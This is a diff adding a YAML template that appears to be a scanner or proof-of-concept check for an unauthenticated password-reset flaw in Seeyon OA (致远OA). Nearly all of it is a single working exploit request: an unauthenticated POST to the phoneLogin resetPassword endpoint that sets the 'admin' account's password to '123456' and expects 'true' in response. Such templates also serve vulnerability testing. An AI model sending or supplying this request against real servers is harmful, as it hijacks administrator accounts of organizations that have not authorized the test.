@@ -1,0 +1,27 @@
+id:
+
+info:
+  name: 致远OA 前台任意用户密码修改漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /seeyon/rest/phoneLogin/phoneCode/resetPassword
+  headers:
+    Content-Type: application/json
+    Content-Length: 45
+    Connection: close
+  data: |
+    {"loginName":"admin","password":"123456"}
+response1:
+  headers:
+  body: true
+  code:
+requests2:
+response2:
+
+
+
+
